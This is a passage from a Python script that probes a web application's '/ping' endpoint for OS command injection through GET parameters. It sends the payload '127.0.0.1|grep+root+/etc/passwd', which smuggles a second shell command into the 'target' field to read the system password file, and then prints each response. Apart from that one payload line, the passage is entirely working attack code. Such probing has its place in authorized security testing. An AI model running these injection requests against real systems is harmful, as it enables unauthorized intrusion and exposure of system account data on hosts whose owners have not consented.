    ("GET param target", f"/ping?target=127.0.0.1|grep+root+/etc/passwd"),
]

print("\n[Testing alternative injection points via GET parameters]")
print("-" * 60)

for name, path in alternative_tests:
    print(f"\n[Testing: {name}]")
    try:
        url = f"{BASE_URL}{path}"
        resp = requests.get(url, timeout=TIMEOUT)
        print(f"  Status: {resp.status_code}")
        resp_text = resp.text[:300].replace('\n', ' ')
        print(f"  Response: {resp_text}")
    except requests.RequestException as e:
        print(f"  ERROR: {e}")
    time.sleep(0.3)

